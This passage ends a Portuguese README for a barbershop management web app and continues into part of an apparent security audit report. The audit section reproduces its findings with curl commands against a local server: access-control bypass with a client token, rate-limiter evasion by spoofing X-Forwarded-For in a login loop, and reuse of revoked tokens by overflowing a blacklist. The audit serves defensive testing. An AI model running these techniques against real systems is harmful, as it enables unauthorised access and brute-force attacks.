## Instalação

```bash
git clone https://github.com/AlanMarskerman/Barber-Select.git
cd Barber-Select
npm install
cp .env.example .env   # preencha os valores (veja abaixo)
npm run dev            # http://localhost:3000
```

### Variáveis de ambiente

| Variável | Descrição |
|---|---|
| `PORT` | Porta do servidor (padrão `3000`) |
| `JWT_SECRET` | Segredo do access token — **mínimo 32 caracteres, obrigatório** |
| `JWT_REFRESH_SECRET` | Segredo do refresh token — **mínimo 32 caracteres, diferente do anterior** |
| `DB_HOST`, `DB_USER`, `DB_PASSWORD`, `DB_NAME` | Conexão MySQL |
| `ALLOW_DEFAULT_SEED` | `true` **apenas em desenvolvimento**: cria a conta admin inicial |

### Banco de dados

As tabelas e migrações são criadas automaticamente no boot do servidor.
Para o seed de contas padrão (somente dev):

```bash
ALLOW_DEFAULT_SEED=true SEED_ADMIN_PASSWORD="<senha forte>" npm run dev
```

> ⚠️ **Nunca habilite o seed em produção.** A conta admin inicial é criada apenas
> com a senha que você definir em `SEED_ADMIN_PASSWORD`, e você deve trocá-la
> no primeiro acesso.

## Scripts

| Comando | O que faz |
|---|---|
| `npm start` | Sobe o servidor (produção) |
| `npm run dev` | Sobe com `--watch` (desenvolvimento) |
| `npm test` | Testes (Node test runner + supertest) |
| `npm run lint` | ESLint |
| `npm run check` | `lint` + `test` |

## Papéis

| Papel | O que acessa |
|---|---|
| `client` | Agenda própria, perfil, pedidos de agendamento, exportação e exclusão de dados |
| `staff` | Agenda da barbearia, clientes, serviços, produtos, vendas |
| `admin` | Tudo + equipe, financeiro e relatórios |

> A autorização é aplicada **no servidor**, em cada rota. O `role` guardado no
> navegador serve apenas para decidir qual interface exibir.

## Estrutura

```
server.js              entrada do Express, auth, rotas /auth/*
features/
  cadastro-mysql/      autenticação de clientes e equipe (MySQL)
  clientes-mysql/      perfil do cliente + LGPD (acesso, correção, portabilidade, eliminação)
  servicos-mysql/      catálogo de serviços
  agenda-mysql/        agendamentos
  produtos-mysql/      estoque
  financeiro-mysql/    lançamentos do caixa
  vendas-mysql/        PDV (integra estoque e financeiro)
public/
  index.html           landing page
  pages/               login e cadastro
  client/              área do cliente
  staff/               painel da equipe
  js/core/shared.js    sessão, refresh token, fetch autenticado, logout
  styles/              design tokens e estilos
```

## LGPD

O Barber-Select atua como **operadora** de dados (art. 5, VII) dos clientes da
barbearia, e a barbearia é a **controladora** (art. 5, VI).

- [Aviso de Privacidade](public/pages/privacidade.html)
- [Termos de Uso](public/pages/termos.html)
- Encarregado (DPO): `dpo@barberselect.local`

O cliente pode exercer seus direitos (acesso, correção, portabilidade, eliminação)
pelo próprio painel, em **Configurações → Privacidade**.

## Contribuindo

1. Abra uma issue descrevendo o problema.
2. Crie um branch: `git checkout -b feat/minha-mudanca`.
3. Rode `npm run check` antes de abrir o PR.
4. Convention commits no padrão Conventional Commits.

## Licença

ISC
```

---

*Auditoria realizada sobre o commit `994fd3d` da branch `dev`. Achados marcados como "confirmado em runtime" foram reproduzidos no servidor real em execução (Node 26 + Chromium via Playwright); os demais foram verificados por leitura do código com referência a arquivo e linha.*

---

## 🧪 14. Como reproduzir os achados principais

```bash
git clone --branch dev https://github.com/AlanMarskerman/Barber-Select.git
cd Barber-Select && npm install
cp .env.example .env      # (não existe hoje — ver X-22)
node server.js            # porta 3399/3000 conforme o .env
```

**1 — RBAC (P0-01):** faça login como cliente e chame as rotas de dados.

```bash
TOKEN=$(curl -s -X POST http://localhost:3000/auth/login/unified \
  -H 'Content-Type: application/json' \
  -d '{"identity":"cliente.demo","password":"..."}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["accessToken"])')

curl -s -o /dev/null -w "finance      %{http_code}\n" -H "Authorization: Bearer $TOKEN" http://localhost:3000/api/finance
curl -s -o /dev/null -w "clients      %{http_code}\n" -H "Authorization: Bearer $TOKEN" http://localhost:3000/api/clients
# esperado: finance 403 (hoje: 500 = passou pela authz) · clients 403
```

**2 — Rate limiter inerte (X-01):**

```bash
for i in $(seq 1 13); do
  curl -s -o /dev/null -w "%{http_code} " -X POST http://localhost:3000/auth/login/unified \
    -H 'Content-Type: application/json' \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -d '{"identity":"inexistente'$i'","password":"errada"}'
done
# esperado: 429 a partir da 11ª · hoje: 13× 401
```

**3 — CSP bloqueando o app (P0-02):** abra o console do navegador em `/client/home.html` e recarregue. Verá *"Executing inline script violates ... 'script-src 'self''"* e a tela Showing `Olá, Cliente` com **0** agendamentos.

**4 — DM Sans ausente (P0-04):**

```bash
curl -s "https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..405,400" | head -1
# → 400 Bad Request  (com 9..40 → 200)
```

**5 — Colunas LGPD ausentes no MySQL (P0-05):**

```sql
SHOW COLUMNS FROM clients;
-- falta birthdate, cpf, fav_barber, hair_style, beard_style, skin_notes, loyalty_points
-- → GET /api/clients/me/export e PUT /api/clients/me devolvem 500
```

**6 — Blacklist que ressuscita tokens (X-04):** logout → usar o token antigo → `401`; em popular a blacklist acima de 1000 entradas → o mesmo token volta a dar `200`.

**7 — Inspecção de design (D-01):**

```bash
node <taste-skill>/scripts/lint.mjs public/index.html
node <taste-skill>/scripts/inspect.mjs public/index.html   # requer CHROME_PATH
```

**8 — Auditoria de dependências:**

```bash
npm audit
# proxy-addr → CRITICAL (bypass de IP) · body-parser → HIGH (DoS)
```

---
